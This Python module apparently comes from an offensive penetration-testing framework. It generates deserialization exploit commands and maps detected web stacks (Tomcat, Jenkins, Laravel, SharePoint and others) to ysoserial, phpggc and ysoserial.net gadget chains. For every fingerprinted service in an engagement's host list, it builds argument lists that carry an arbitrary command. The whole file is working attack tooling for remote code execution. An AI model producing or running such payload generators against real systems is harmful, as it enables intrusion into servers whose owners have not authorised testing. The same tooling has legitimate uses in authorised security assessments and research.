"""Generalized deserialization payload generation.

Deserialization is one of the widest RCE classes on the web (Java, PHP, .NET,
Python, Ruby). Instead of a per-app module, this is a library keyed on the
detected stack: given "the app uses Java Spring", it emits the ysoserial commands
for the gadget chains that pay off there. Same for phpggc / ysoserial.net.

Pure argv generation - the operator runs the gadget through the sink themselves.
"""

from __future__ import annotations

from ..core.state import EngagementState

# Gadget chains that recur most often per language. Keys are lowercase fingerprint
# tokens; values are (gadget-chain, one-line description) pairs.
_JAVA_GADGETS: list[tuple[str, str]] = [
    ("CommonsCollections5", "widely present in older Java stacks; the classic RCE chain"),
    ("CommonsCollections6", "successor to CC5; use when CC5 is patched"),
    ("CommonsBeanutils1", "commons-beanutils on the classpath"),
    ("Groovy1", "Groovy in the classpath (Grails, Jenkins, older Spring)"),
    ("Spring1", "Spring on the classpath"),
    ("Hibernate1", "Hibernate + JavaAssist"),
    ("JSON1", "json-lib gadget"),
    ("Rome", "rome (RSS/Atom) gadget"),
    ("Vaadin1", "Vaadin gadget"),
    ("URLDNS", "DNS-only sanity payload - proves deserialization sink exists"),
]

_PHP_GADGETS: list[tuple[str, str]] = [
    ("Laravel/RCE1", "Laravel APP_KEY known - AES-CBC unserialize -> RCE"),
    ("Laravel/RCE9", "Laravel Ignition unserialize gadget"),
    ("Symfony/RCE1", "Symfony error handler gadget"),
    ("Yii/RCE1", "Yii2 unserialize -> curl_close callable RCE"),
    ("CodeIgniter/RCE1", "CodeIgniter 4 gadget"),
    ("Drupal/RCE1", "Drupal Guzzle gadget"),
    ("Guzzle/RCE1", "any app with Guzzle in vendor/"),
    ("Monolog/RCE1", "any app with Monolog"),
    ("Faker/RCE1", "any app with Faker"),
]

_DOTNET_GADGETS: list[tuple[str, str]] = [
    ("TypeConfuseDelegate", "System.Runtime.Serialization.Formatters.Binary gadget"),
    ("WindowsIdentity", "ObjectDataProvider variant"),
    ("PSObject", "PowerShell PSObject unserialize gadget"),
    ("DataSet", "ADO.NET DataSet - VERY common web-form target"),
    ("ObjectDataProvider", "the flagship WPF/WCF gadget - works in ~all sinks"),
]

# Fingerprint token -> (language, gadget list, tool name, "-f formatter" default).
_STACK_MAP: dict[str, tuple[str, list[tuple[str, str]], str, str]] = {
    "tomcat":       ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "jboss":        ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "weblogic":     ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "wildfly":      ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "spring":       ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "jenkins":      ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "hibernate":    ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "groovy":       ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "java":         ("java",   _JAVA_GADGETS,   "ysoserial",     "hex"),
    "laravel":      ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    "symfony":      ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    "yii":          ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    "codeigniter":  ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    "drupal":       ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    "wordpress":    ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    "php":          ("php",    _PHP_GADGETS,    "phpggc",        "-b"),
    ".net":         ("dotnet", _DOTNET_GADGETS, "ysoserial.net", "-f Json.Net"),
    "aspnet":       ("dotnet", _DOTNET_GADGETS, "ysoserial.net", "-f Json.Net"),
    "iis":          ("dotnet", _DOTNET_GADGETS, "ysoserial.net", "-f Json.Net"),
    "sharepoint":   ("dotnet", _DOTNET_GADGETS, "ysoserial.net", "-f Json.Net"),
}


def stacks_for(fingerprint: str) -> list[tuple[str, list[tuple[str, str]], str, str]]:
    """Every (language, gadgets, tool, formatter) tuple whose token matches."""
    hay = (fingerprint or "").lower()
    out: list[tuple[str, list[tuple[str, str]], str, str]] = []
    seen: set[str] = set()
    for token, entry in _STACK_MAP.items():
        if token in hay and entry[0] not in seen:
            seen.add(entry[0])
            out.append(entry)
    return out


def payload_commands(command: str, fingerprint: str) -> list[tuple[str, str, list[str]]]:
    """(language, gadget-name, argv) for every gadget matching the fingerprint."""
    out: list[tuple[str, str, list[str]]] = []
    for lang, gadgets, tool, formatter in stacks_for(fingerprint):
        for gadget, _note in gadgets:
            if lang == "java":
                argv = [tool, gadget, command]
            elif lang == "php":
                argv = [tool, gadget, command]
            else:  # dotnet
                argv = [tool, *formatter.split(), "-g", gadget, "-c", command]
            out.append((lang, gadget, argv))
    return out


def payload_commands_for_state(cmd: str, state: EngagementState
                               ) -> list[tuple[str, str, str, list[str]]]:
    """(host, language, gadget, argv) for every fingerprinted HTTP service in state."""
    out: list[tuple[str, str, str, list[str]]] = []
    for host in state.hosts.values():
        for svc in host.services.values():
            hay = " ".join([svc.product or "", svc.name or "",
                            svc.banner or "", *svc.notes])
            for lang, gadget, argv in payload_commands(cmd, hay):
                out.append((host.address, lang, gadget, argv))
    return out
